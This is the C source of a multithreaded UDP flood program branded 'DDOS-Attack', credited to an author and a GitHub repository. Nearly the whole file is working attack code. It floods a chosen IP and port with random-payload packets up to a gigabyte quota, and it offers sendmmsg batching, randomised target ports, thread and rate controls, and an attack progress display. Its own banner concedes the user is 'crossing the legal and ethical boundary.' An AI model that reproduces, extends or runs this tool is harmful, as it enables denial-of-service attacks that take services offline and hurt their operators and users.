#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <getopt.h>
#include <pthread.h>
#include <signal.h>
#include <errno.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <stdatomic.h>
#include <stdbool.h>
#include <fcntl.h>

// ======================== Configuration structure ========================
#define MAX_BURST_SIZE 256   // Prevent stack overflow

typedef struct {
    char *target_ip;          // Target IP
    int target_port;          // Target port
    long long total_packets;  // Total packets
    int packet_size;          // Packet size (bytes)
    int num_threads;          // Number of threads
    int burst_size;           // Packets per burst
    double rate_limit;        // Rate limit (seconds per burst)
    int duration;             // Duration (seconds)
    int src_port_base;        // Source port base (-1 = random)
    bool random_target_port;  // Randomize target port
    bool no_prealloc;         // Disable pre-allocation
    char *log_file;           // Log file path
    bool no_interactive;      // Skip confirmation
    int max_retries;          // Max retry count
} Config;

Config g_config;  // Global configuration

// ======================== Shared statistics (atomic operations) ========================
static atomic_ullong total_sent = ATOMIC_VAR_INIT(0);     // Total packets sent
static atomic_ullong total_bytes = ATOMIC_VAR_INIT(0);    // Total bytes sent
static atomic_ullong total_dropped = ATOMIC_VAR_INIT(0);  // Total packets dropped
static volatile bool stop_flag = false;                   // Stop flag

// ======================== Pre-allocated address array ========================
static struct sockaddr_in *port_addrs = NULL;

// ======================== Logging ========================
static FILE *log_fp = NULL;

// Log output function (writes to both console and file)
static void log_msg(const char *fmt, ...) {
    va_list args;
    va_start(args, fmt);
    vprintf(fmt, args);
    va_end(args);
    if (log_fp) {
        va_start(args, fmt);
        vfprintf(log_fp, fmt, args);
        va_end(args);
        fflush(log_fp);
    }
}

// ======================== Signal handler ========================
static void sigint_handler(int sig) {
    (void)sig;
    stop_flag = true;
    log_msg("\n[!] Received SIGINT, stopping...\n");
}

// ======================== Clear screen ========================
static void clear_screen(void) {
    system("clear");
}

// ======================== Banner ========================
static void show_banner(void) {
    // ================= 1. Warning page ==================
    clear_screen();
    printf("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   Ha3MrX\n");
    printf("M       MMM M       MMM MMM     MMM MM       MM   Ha3MrX\n");
    printf("M  MMMM   M M  MMMM   M M   MMM   M M  MMMMM  M   Ha3MrX\n");
    printf("M  MMMMM  M M  MMMMM  M M  MMMMM  M M        MM   Ha3MrX\n");
    printf("M  MMMMM  M M  MMMMM  M M  MMMMM  M MMMMMMM   M   Ha3MrX\n");
    printf("M  MMMM   M M  MMMM   M M   MMM   M M   MMM   M   Ha3MrX\n");
    printf("M        MM M        MM MMM     MMM MM       MM   Ha3MrX\n");
    printf("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   Ha3MrX\n");
    printf("\n");
    
    printf("========================= WARNING ==========================\n");
    printf("You are crossing the legal and ethical boundary. \n");
    printf("Please exit immediately, or wait 3 seconds to start.\n");
    printf("============================================================\n");
    sleep(1);
    for (int i = 3; i > 0; i--) {
        printf("%d\n", i);
        sleep(1);
    }
    printf("Starting...\n");
    usleep(500000);
    
    // ====== 2. Clear screen then show figlet ASCII art ======
    clear_screen();
    // Try to invoke figlet to generate ASCII art
    int ret = system("figlet DDOS-Attack 2>/dev/null");
    if (ret != 0) {
        // If figlet is unavailable, use the ASCII fallback
        printf(" ____  ____   ___  ____          _   _   _             _     \n");
        printf("|  _ \|  _ \ / _ \/ ___|        / \ | |_| |_ __ _  ___| | __ \n");
        printf("| | | | | | | | | \___ \ _____ / _ \| __| __/ _` |/ __| |/ / \n");
        printf("| |_| | |_| | |_| |___) |_____/ ___ \ |_| || (_| | (__|   <  \n");
        printf("|____/|____/ \___/|____/     /_/   \_\__|\__\__,_|\___|_|\_\ \n");   
    }
    printf("Author  : Ha3MrX\n");
    printf("GitHub  : https://github.com/Ha3MrX/DDos-Attack\n\n");
}

// ======================== Built-in argument parsing ========================
static void print_usage(const char *prog) {
    fprintf(stderr,
        "Usage: %s -t <targetIP> -p <port> -g <GB> [options]\n"
        "  -t, --target        Target IP address\n"
        "  -p, --port          Target UDP port\n"
        "  -g, --gb            Total traffic (GB)\n"
        "  -P, --processes     Number of threads (default 4)\n"
        "  -T  --threads       Same as -P\n"
        "  -b, --burst         Packets per burst (max %d, default 50)\n"
        "  -r, --rate          Rate limit (seconds per burst, default 0)\n"
        "  -d, --duration      Attack duration (seconds, 0 = until finished)\n"
        "  -s, --src-port      Source port base (offset per thread)\n"
        "      --size          Packet size (bytes, 64-65507, default 1490)\n"
        "      --random-port   Randomize target port per packet\n"
        "      --no-prealloc   Disable pre-allocation (saves memory, slightly slower)\n"
        "      --log           Log file path\n"
        "      --no-interactive Skip confirmation\n"
        "      --max-retries   Max retry count (default 3)\n"
        "  -h, --help          Show this help\n",
        prog, MAX_BURST_SIZE);
    exit(1);
}

static void parse_args(int argc, char **argv) {
    static struct option long_opts[] = {
        {"target", required_argument, 0, 't'},
        {"port", required_argument, 0, 'p'},
        {"gb", required_argument, 0, 'g'},
        {"processes", required_argument, 0, 'P'},
        {"threads", required_argument, 0, 'T'},
        {"burst", required_argument, 0, 'b'},
        {"rate", required_argument, 0, 'r'},
        {"duration", required_argument, 0, 'd'},
        {"src-port", required_argument, 0, 's'},
        {"size", required_argument, 0, 1},
        {"random-port", no_argument, 0, 2},
        {"no-prealloc", no_argument, 0, 3},
        {"log", required_argument, 0, 4},
        {"no-interactive", no_argument, 0, 5},
        {"max-retries", required_argument, 0, 6},
        {"help", no_argument, 0, 'h'},
        {0,0,0,0}
    };

    // Set defaults
    g_config.target_ip = NULL;
    g_config.target_port = 0;
    g_config.total_packets = 0;
    g_config.packet_size = 1490;
    g_config.num_threads = 4;
    g_config.burst_size = 50;
    g_config.rate_limit = 0.0;
    g_config.duration = 0;
    g_config.src_port_base = -1;
    g_config.random_target_port = false;
    g_config.no_prealloc = false;
    g_config.log_file = NULL;
    g_config.no_interactive = false;
    g_config.max_retries = 3;

    double gb = 0.0;
    int opt, idx;
    while ((opt = getopt_long(argc, argv, "t:p:g:P:T:b:r:d:s:h", long_opts, &idx)) != -1) {
        switch (opt) {
            case 't': g_config.target_ip = strdup(optarg); break;
            case 'p': g_config.target_port = atoi(optarg); break;
            case 'g': gb = atof(optarg); break;
            case 'P': case 'T': g_config.num_threads = atoi(optarg); break;
            case 'b': g_config.burst_size = atoi(optarg); break;
            case 'r': g_config.rate_limit = atof(optarg); break;
            case 'd': g_config.duration = atoi(optarg); break;
            case 's': g_config.src_port_base = atoi(optarg); break;
            case 1: g_config.packet_size = atoi(optarg); break;
            case 2: g_config.random_target_port = true; break;
            case 3: g_config.no_prealloc = true; break;
            case 4: g_config.log_file = strdup(optarg); break;
            case 5: g_config.no_interactive = true; break;
            case 6: g_config.max_retries = atoi(optarg); break;
            case 'h': default: print_usage(argv[0]);
        }
    }

    // Check required arguments
    if (!g_config.target_ip || g_config.target_port == 0 || gb <= 0.0) {
        fprintf(stderr, "Missing required arguments (-t, -p, -g).\n");
        print_usage(argv[0]);
    }

    // Clamp burst size
    if (g_config.burst_size > MAX_BURST_SIZE) {
        fprintf(stderr, "Burst size limited to %d\n", MAX_BURST_SIZE);
        g_config.burst_size = MAX_BURST_SIZE;
    }
    if (g_config.burst_size < 1) g_config.burst_size = 1;

    // Validate packet size
    if (g_config.packet_size < 64) g_config.packet_size = 64;
    if (g_config.packet_size > 65507) g_config.packet_size = 65507;

    // Compute total packets
    g_config.total_packets = (long long)(gb * 1024.0 * 1024.0 * 1024.0 / g_config.packet_size);
    if (g_config.total_packets <= 0) {
        fprintf(stderr, "Traffic too small.\n");
        exit(1);
    }

    if (g_config.num_threads <= 0) g_config.num_threads = 1;
    if (g_config.max_retries < 0) g_config.max_retries = 0;
}

// ======================== Retry utility (with delay, retry only on EAGAIN/EWOULDBLOCK) ========================
static bool send_with_retry(int sockfd, const void *buf, size_t len,
                            const struct sockaddr *dest, socklen_t addrlen,
                            int max_retries) {
    int attempts = 0;
    while (attempts < max_retries) {
        ssize_t n = sendto(sockfd, buf, len, 0, dest, addrlen);
        if (n > 0) return true;  // Sent successfully
        if (n < 0) {
            if (errno == EAGAIN || errno == EWOULDBLOCK) {
                attempts++;
                usleep(1000);  // 1ms tiny delay to reduce CPU spinning
                continue;
            } else {
                return false;  // Other error, give up
            }
        }
        attempts++;
    }
    return false;
}

// ======================== sendmmsg wrapper (Linux) ========================
static bool use_sendmmsg = false;

#ifdef __linux__
#include <sys/socket.h>
static int send_batch_mmsg(int sockfd, const void *buf, size_t len,
                           const struct sockaddr_in *dest, socklen_t addrlen,
                           int count) {
    struct mmsghdr msgs[count];
    struct iovec iov[count];
    // All messages reuse the same target address (no copy)
    for (int i = 0; i < count; i++) {
        iov[i].iov_base = (void*)buf;
        iov[i].iov_len = len;
        msgs[i].msg_hdr.msg_name = (void*)dest;      // Shared pointer
        msgs[i].msg_hdr.msg_namelen = addrlen;
        msgs[i].msg_hdr.msg_iov = &iov[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
        msgs[i].msg_hdr.msg_control = NULL;
        msgs[i].msg_hdr.msg_controllen = 0;
        msgs[i].msg_hdr.msg_flags = 0;
        msgs[i].msg_len = 0;
    }
    return sendmmsg(sockfd, msgs, count, 0);
}
#endif

// ======================== Thread function ========================
static void *sender_thread(void *arg) {
    long thread_id = (long)arg;
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        log_msg("Thread %ld: socket creation failed\n", thread_id);
        return NULL;
    }

    // Bind source port (if specified)
    if (g_config.src_port_base >= 0) {
        int src_port = g_config.src_port_base + (int)thread_id;
        struct sockaddr_in src_addr;
        src_addr.sin_family = AF_INET;
        src_addr.sin_port = htons(src_port);
        src_addr.sin_addr.s_addr = INADDR_ANY;
        if (bind(sockfd, (struct sockaddr*)&src_addr, sizeof(src_addr)) < 0) {
            log_msg("Thread %ld: bind to port %d failed (%s), using random port\n",
                    thread_id, src_port, strerror(errno));
        }
    }

    // Target address (initial value)
    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(g_config.target_port);
    inet_pton(AF_INET, g_config.target_ip, &target_addr.sin_addr);

    // Allocate payload buffer
    unsigned char *payload = (unsigned char*)malloc(g_config.packet_size);
    if (!payload) {
        close(sockfd);
        log_msg("Thread %ld: malloc failed\n", thread_id);
        return NULL;
    }
    // Fill payload with random data (per-thread independent seed)
    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)thread_id ^ (unsigned int)pthread_self();
    for (int i = 0; i < g_config.packet_size; i++) {
        payload[i] = rand_r(&seed) & 0xff;
    }

    // Compute packets this thread should send
    long long packets_to_send = g_config.total_packets / g_config.num_threads;
    if (thread_id < g_config.total_packets % g_config.num_threads) {
        packets_to_send++;
    }

    long long sent = 0;          // Local sent counter
    long long bytes_sent = 0;    // Local bytes counter
    long long dropped = 0;       // Local dropped counter
    // Last reported values (for incremental update)
    long long last_sent = 0, last_bytes = 0, last_dropped = 0;

    while (!stop_flag && sent < packets_to_send) {
        int to_send = g_config.burst_size;
        if (sent + to_send > packets_to_send) {
            to_send = (int)(packets_to_send - sent);
        }

        if (g_config.random_target_port) {
            // Random port mode: send one by one
            for (int i = 0; i < to_send; i++) {
                if (stop_flag || sent >= packets_to_send) break;
                int port = 1 + (rand_r(&seed) % 65535);
                if (g_config.no_prealloc || port_addrs == NULL) {
                    // No pre-allocation, set port each time
                    target_addr.sin_port = htons(port);
                    // sin_addr remains unchanged, no need to reset
                } else {
                    // Directly copy the pre-allocated address structure
                    target_addr = port_addrs[port];
                }
                bool ok = send_with_retry(sockfd, payload, g_config.packet_size,
                                          (struct sockaddr*)&target_addr,
                                          sizeof(target_addr), g_config.max_retries);
                if (ok) {
                    sent++;
                    bytes_sent += g_config.packet_size;
                } else {
                    dropped++;
                }
            }
        } else {
            // Fixed port: can use sendmmsg or loop
#ifdef __linux__
            if (use_sendmmsg) {
                int remaining = to_send;
                while (remaining > 0 && !stop_flag && sent < packets_to_send) {
                    int sent_now = send_batch_mmsg(sockfd, payload, g_config.packet_size,
                                                   &target_addr, sizeof(target_addr), remaining);
                    if (sent_now > 0) {
                        sent += sent_now;
                        bytes_sent += (long long)sent_now * g_config.packet_size;
                        remaining -= sent_now;
                    } else {
                        // sendmmsg failed completely, fall back to per-packet retry for remaining
                        for (int i = 0; i < remaining; i++) {
                            if (stop_flag || sent >= packets_to_send) break;
                            bool ok = send_with_retry(sockfd, payload, g_config.packet_size,
                                                      (struct sockaddr*)&target_addr,
                                                      sizeof(target_addr), g_config.max_retries);
                            if (ok) {
                                sent++;
                                bytes_sent += g_config.packet_size;
                            } else {
                                dropped++;
                            }
                        }
                        break; // Exit the while loop
                    }
                }
            } else
#endif
            {
                // Ordinary sendto loop
                for (int i = 0; i < to_send; i++) {
                    if (stop_flag || sent >= packets_to_send) break;
                    bool ok = send_with_retry(sockfd, payload, g_config.packet_size,
                                              (struct sockaddr*)&target_addr,
                                              sizeof(target_addr), g_config.max_retries);
                    if (ok) {
                        sent++;
                        bytes_sent += g_config.packet_size;
                    } else {
                        dropped++;
                    }
                }
            }
        }

        // Incrementally update global statistics (using atomic operations)
        long long delta_sent = sent - last_sent;
        long long delta_bytes = bytes_sent - last_bytes;
        long long delta_dropped = dropped - last_dropped;
        if (delta_sent > 0) atomic_fetch_add(&total_sent, delta_sent);
        if (delta_bytes > 0) atomic_fetch_add(&total_bytes, delta_bytes);
        if (delta_dropped > 0) atomic_fetch_add(&total_dropped, delta_dropped);
        last_sent = sent;
        last_bytes = bytes_sent;
        last_dropped = dropped;

        // Rate limit
        if (g_config.rate_limit > 0.0) {
            struct timespec ts = {
                .tv_sec = (time_t)g_config.rate_limit,
                .tv_nsec = (long)((g_config.rate_limit - (time_t)g_config.rate_limit) * 1e9)
            };
            nanosleep(&ts, NULL);
        }
        // Otherwise busy loop, let the OS handle scheduling
    }

    // Final update (to avoid missed reports)
    long long delta_sent = sent - last_sent;
    long long delta_bytes = bytes_sent - last_bytes;
    long long delta_dropped = dropped - last_dropped;
    if (delta_sent > 0) atomic_fetch_add(&total_sent, delta_sent);
    if (delta_bytes > 0) atomic_fetch_add(&total_bytes, delta_bytes);
    if (delta_dropped > 0) atomic_fetch_add(&total_dropped, delta_dropped);

    free(payload);
    close(sockfd);
    return NULL;
}

// ======================== Main function ========================
int main(int argc, char **argv) {
    // Parse command-line arguments
    parse_args(argc, argv);

    // Open log file (continue on failure)
    if (g_config.log_file) {
        log_fp = fopen(g_config.log_file, "a");
        if (!log_fp) {
            fprintf(stderr, "Warning: could not open log file '%s', continuing.\n", g_config.log_file);
        } else {
            time_t now = time(NULL);
            fprintf(log_fp, "\n--- Attack session started at %s", ctime(&now));
            fflush(log_fp);
        }
    }

    // Register SIGINT handler
    signal(SIGINT, sigint_handler);

    // Show banner (warning page + figlet ASCII art)
    show_banner();

    // Validate target IP
    struct sockaddr_in test_addr;
    if (inet_pton(AF_INET, g_config.target_ip, &test_addr.sin_addr) != 1) {
        log_msg("Invalid target IP.\n");
        goto cleanup;
    }
    if (g_config.target_port < 1 || g_config.target_port > 65535) {
        log_msg("Port out of range.\n");
        goto cleanup;
    }

    // Pre-allocate address array for random port mode (unless disabled)
    if (g_config.random_target_port && !g_config.no_prealloc) {
        port_addrs = (struct sockaddr_in*)malloc(65536 * sizeof(struct sockaddr_in));
        if (!port_addrs) {
            log_msg("Memory allocation failed, will use non-preallocated mode.\n");
            g_config.no_prealloc = true;
        } else {
            for (int i = 1; i <= 65535; i++) {
                port_addrs[i].sin_family = AF_INET;
                port_addrs[i].sin_port = htons(i);
                port_addrs[i].sin_addr = test_addr.sin_addr;
            }
            log_msg("[>] Random port pre-allocation enabled (65535 addresses).\n");
        }
    }

    // Detect sendmmsg support (Linux)
#ifdef __linux__
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock >= 0) {
        use_sendmmsg = true;
        close(sock);
    }
#endif

    // Print attack summary
    log_msg("\n[>] Attack summary:\n");
    log_msg("    Target: %s:%d (UDP)\n", g_config.target_ip, g_config.target_port);
    log_msg("    Total packets: %lld\n", g_config.total_packets);
    log_msg("    Packet size: %d bytes\n", g_config.packet_size);
    log_msg("    Threads: %d\n", g_config.num_threads);
    if (g_config.src_port_base >= 0)
        log_msg("    Source port base: %d (offset per thread)\n", g_config.src_port_base);
    if (g_config.rate_limit > 0.0)
        log_msg("    Rate limit: %.3f seconds per burst\n", g_config.rate_limit);
    if (g_config.duration > 0)
        log_msg("    Duration: %d seconds\n", g_config.duration);
    if (g_config.random_target_port) {
        log_msg("    Random target port: ON");
        if (port_addrs && !g_config.no_prealloc)
            log_msg(" (with pre-allocation)\n");
        else
            log_msg(" (without pre-allocation)\n");
    }
    log_msg("    Burst size: %d\n", g_config.burst_size);
    log_msg("    Max retries: %d\n", g_config.max_retries);
    if (use_sendmmsg)
        log_msg("    sendmmsg: ENABLED (Linux batch send)\n");
    else
        log_msg("    sendmmsg: DISABLED\n");

    // Interactive confirmation
    if (!g_config.no_interactive) {
        printf("\n[!] Confirm attack (yes/no): ");
        fflush(stdout);
        char buf[8];
        if (!fgets(buf, sizeof(buf), stdin) || strncmp(buf, "yes", 3) != 0) {
            log_msg("[>] Cancelled.\n");
            if (log_fp) fclose(log_fp);
            exit(0);
        }
    }

    // Allocate threads
    pthread_t *threads = (pthread_t*)malloc(g_config.num_threads * sizeof(pthread_t));
    if (!threads) {
        log_msg("Thread allocation failed\n");
        goto cleanup;
    }

    // Obtain high-precision timer
    struct timespec start_ts;
    clock_gettime(CLOCK_MONOTONIC, &start_ts);

    // Start threads
    int created = 0;
    for (int i = 0; i < g_config.num_threads; i++) {
        if (pthread_create(&threads[i], NULL, sender_thread, (void*)(long)i) != 0) {
            log_msg("Failed to create thread %d\n", i);
            break;
        }
        created++;
    }

    // If fewer threads were created than expected, stop immediately
    if (created < g_config.num_threads) {
        stop_flag = true;
        log_msg("[!] Some threads failed to start, attack aborted. Waiting for created threads to exit...\n");
        if (created > 0) {
            for (int i = 0; i < created; i++) {
                pthread_join(threads[i], NULL);
            }
        }
        free(threads);
        goto cleanup;
    }

    // Progress monitoring loop
    while (!stop_flag) {
        unsigned long long sent = atomic_load(&total_sent);
        if (sent >= g_config.total_packets) break;
        if (g_config.duration > 0) {
            struct timespec now_ts;
            clock_gettime(CLOCK_MONOTONIC, &now_ts);
            double elapsed = (now_ts.tv_sec - start_ts.tv_sec) +
                             (now_ts.tv_nsec - start_ts.tv_nsec) / 1e9;
            if (elapsed >= g_config.duration) {
                stop_flag = true;
                break;
            }
        }
        if (sent > 0) {
            struct timespec now_ts;
            clock_gettime(CLOCK_MONOTONIC, &now_ts);
            double elapsed = (now_ts.tv_sec - start_ts.tv_sec) +
                             (now_ts.tv_nsec - start_ts.tv_nsec) / 1e9;
            if (elapsed < 0.001) elapsed = 0.001;
            double progress = (double)sent / g_config.total_packets * 100.0;
            int bar_len = 30;
            int filled = (int)(bar_len * progress / 100.0);
            char bar[31];
            memset(bar, '█', filled);
            memset(bar+filled, '░', bar_len - filled);
            bar[bar_len] = '\0';
            double eta = (elapsed / sent) * (g_config.total_packets - sent);
            double rate = sent / elapsed;
            double data_gb = (double)atomic_load(&total_bytes) / (1024.0*1024*1024);
            unsigned long long dropped = atomic_load(&total_dropped);
            printf("\r[%s] %.1f%% | %llu/%lld packets | %.3f GB | Rate: %.1f pps | Dropped: %llu | ETA: %.0fs",
                   bar, progress, sent, g_config.total_packets, data_gb, rate, dropped, eta);
            fflush(stdout);
        }
        usleep(500000); // 0.5 seconds
    }

    // Set stop flag
    stop_flag = true;

    // Wait for all threads to finish
    for (int i = 0; i < g_config.num_threads; i++) {
        pthread_join(threads[i], NULL);
    }
    free(threads);

    // Final statistics
    struct timespec end_ts;
    clock_gettime(CLOCK_MONOTONIC, &end_ts);
    double elapsed = (end_ts.tv_sec - start_ts.tv_sec) +
                     (end_ts.tv_nsec - start_ts.tv_nsec) / 1e9;
    unsigned long long final_sent = atomic_load(&total_sent);
    unsigned long long final_bytes = atomic_load(&total_bytes);
    unsigned long long final_dropped = atomic_load(&total_dropped);
    log_msg("\n[>] Attack finished.\n");
    log_msg("    Packets sent: %llu\n", final_sent);
    log_msg("    Packets dropped: %llu\n", final_dropped);
    log_msg("    Total data: %.4f GB\n", final_bytes / (1024.0*1024*1024));
    log_msg("    Elapsed time: %.2f seconds\n", elapsed);
    if (elapsed > 0.0) {
        log_msg("    Average rate: %.1f pps\n", final_sent / elapsed);
    }

cleanup:
    // Release resources
    if (port_addrs) free(port_addrs);
    if (g_config.target_ip) free(g_config.target_ip);
    if (g_config.log_file) free(g_config.log_file);
    if (log_fp) fclose(log_fp);
    return 0;
}
